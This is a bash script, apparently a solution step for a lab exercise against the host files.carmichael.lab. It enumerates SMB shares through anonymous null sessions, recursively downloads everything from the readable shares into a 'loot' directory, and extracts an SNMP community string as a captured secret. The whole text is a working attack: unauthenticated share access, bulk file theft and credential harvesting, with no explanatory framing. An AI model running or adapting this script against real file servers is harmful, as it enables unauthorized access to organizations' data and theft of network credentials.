#!/bin/bash
mkdir -p results
loot=$(mktemp -d /tmp/loot.XXXXXX)
for share in $(smbmap -H files.carmichael.lab -u "" -p "" 2>/dev/null | tr -d '\r' |
               awk '$2 ~ /^READ/ && $1 != "public" && $1 !~ /^(IPC\$|ADMIN\$|C\$)$/ && $1 ~ /^[a-zA-Z0-9_-]+$/ {print $1}'); do
  mkdir -p "$loot/$share"
  ( cd "$loot/$share" && smbclient //files.carmichael.lab/"$share" -N \
      -c "recurse ON; prompt OFF; mget *" >/dev/null 2>&1 )
done
secret=$(grep -rhoqE 'SNMP_COMMUNITY="[^"]+"' "$loot" 2>/dev/null && grep -rhoE 'SNMP_COMMUNITY="[^"]+"' "$loot" | head -n 1)
printf '%s\n' "$secret" | tee results/5-smb_share_loot.txt
rm -rf "$loot"
